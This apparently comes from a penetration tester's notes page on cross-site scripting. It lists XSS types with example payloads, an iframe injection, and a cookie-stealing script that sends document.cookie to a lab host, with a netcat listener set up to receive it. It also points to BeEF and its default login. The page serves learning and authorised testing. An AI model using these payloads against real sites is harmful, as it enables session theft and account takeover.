# Cross-site scripting (XSS)

> Cross-site scripting is a type of computer security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.  
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)</cite>

* [XSS Filter Evasion Cheat Sheet - OWASP](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [PayloadsAllTheThings/XSS Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [GitHub - mandatoryprogrammer/xsshunter: The XSS Hunter service - a portable version of XSSHunter.com](https://github.com/mandatoryprogrammer/xsshunter)
* [http://html5sec.org](http://html5sec.org)
* [PortSwigger Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [XSSMap](https://github.com/Jewel591/xssmap)


## Types of XSS

### Reflected (non-persistent)

> Javascript sent in a request, e.g. via query parameters or form data, is reflected in the response.  
E.g.:
```
https://domain.com/?error=<script>alert(1)</script>
```

### Stored (persistent)

> Javascript code gets stored on the server and displayed in an unsafe way to other users.  
E.g.:  
Use `<script>alert(1)</script>` as username.  

Via img: `<img src="." onerror="alert('test');" />`  
Via url: `<a href="javascript:alert('test')>test</a>`

### DOM-based

> Attacker gets control over Javascript variables that are written to the DOM or used in methods like `eval()`.  

### Blind

> Similar to "Stored", but you won't see the output/impact directly.  
E.g.
* Submitting a contact form containing XSS

## Polyglots

[Xss JaVaSCRipt PoLYglOTs](https://dev.to/caffiendkitten/xss-javascript-polyglots-4i64)  

## Iframe injection

```html
<iframe src="http://10.11.0.5/report" height="0" width="0"></iframe>
```

## Stealing cookies & sessions
```javascript
<script>
new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
</script> 
```

```bash
nc -nlvp 80
```

-> Use session with e.g. CookiesManager+

## BeEF

BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.  
[BeEF - The Browser Exploitation Framework Project](https://beefproject.com)

Start `./beef`  
Username: beef  
Password: beef
